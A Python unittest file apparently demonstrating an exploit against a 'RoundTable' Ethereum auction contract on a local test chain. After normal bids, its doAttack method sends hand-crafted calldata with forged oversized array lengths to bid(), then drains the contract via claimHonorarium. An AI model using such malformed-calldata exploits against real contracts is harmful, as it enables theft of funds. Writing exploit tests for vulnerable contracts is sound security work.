
from web3 import Web3, RPCProvider
import json, unittest

#Run this via
#docker run -p 8545:8545 ethereumjs/testrpc:latest

class TestRoundtable(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.web3 = Web3(RPCProvider())
        abi = json.loads(open('RoundTable.abi').read())
        bin = open('RoundTable.bin').read()
        contract = cls.web3.eth.contract(abi=abi, bytecode=bin)
        
        cls.war_chest = "0x000000000000000000000000000000000000cafe"
        val = 100000000000000000000L # 100 ether
        tx = contract.deploy({'from': cls.web3.eth.accounts[0], "value": val},[cls.war_chest])
        cls.roundtable = contract(cls.web3.eth.getTransactionReceipt(tx)['contractAddress'])

    def print_info(self, title):
        print("## %s\n" % title)
        print( "Holdings\n")
        print( " - acc[0] `%d`" % self.web3.eth.getBalance(self.web3.eth.accounts[0]))
        print( " - acc[1] `%d`" % self.web3.eth.getBalance(self.web3.eth.accounts[1]))
        print( " - acc[2] `%d`"% self.web3.eth.getBalance(self.web3.eth.accounts[2]))
        print( " - roundtable  `%d`" %self.web3.eth.getBalance(self.roundtable.address))
        print( " - war chest `%d`" % self.web3.eth.getBalance(self.war_chest))
        print( " - creator honorarium `%d`" % self.roundtable.call().creator_balance())
        print("")


    def doAttack(self):
        print("> Get rich or die trying\n")
        # '0x69f30401' for function 'bid(address,uint256[],uint256[])'
        sig = "69f30401"


        args = [ sig, #method
         "00000000000000000000000000000000000000000000000000000000cafebabe", #bidder
         "0000000000000000000000000000000000000000000000000000000000000060", #datapart_1_param
         "00000000000000000000000000000000000000000000000000000000000000A0", #datapart_2_param
         "F000000000000000000000000000000000000000000000000000000000000001", #len_of_array_1
         "0000000000000000000000000000000000000000000000000000000000000003", #seat 3 #array_1
         "F000000000000000000000000000000000000000000000000000000000000001", #len_of_array_2
         "0000000000000000000000000000000000000000000000000de0b6b3a7640000", # 1 ether #array_2
        ]
        data = "".join(args)

        self.web3.eth.sendTransaction({
            "to" : self.roundtable.address,
            "data" : data,
            "value" : 1000000000000000000L, 
            "gas" : 1185919,
            })

        self.print_info("After attack")
        cash = self.web3.eth.getBalance(self.roundtable.address)
        self.roundtable.transact({"from" : self.web3.eth.accounts[0]}).claimHonorarium(cash)
        self.print_info("After cashout")


    def doBid(self, seat, val,  acct):
        tx = { "value" : val, "from" : acct}
        self.roundtable.transact(tx).bid(acct , [ seat ], [ val ])
 
    def testCreation(self):

        self.print_info("After deployment")
        # Successfull bid
        self.doBid(1, 100000000000000000000L, self.web3.eth.accounts[1])
        self.assertEquals(self.web3.eth.accounts[1] , self.roundtable.call().seatHolder(1))

        # Failed bid
        self.doBid(1, 100500000000000000000L, self.web3.eth.accounts[2])
        self.assertEquals(self.web3.eth.accounts[1] , self.roundtable.call().seatHolder(1))

        # Successfull overbid
        self.doBid(1, 111100000000000000000L, self.web3.eth.accounts[2])
        self.assertEquals(self.web3.eth.accounts[2] , self.roundtable.call().seatHolder(1))

        self.print_info("After some auctions")
        # Test attack
        self.doAttack()


if __name__ == '__main__':
    unittest.main()
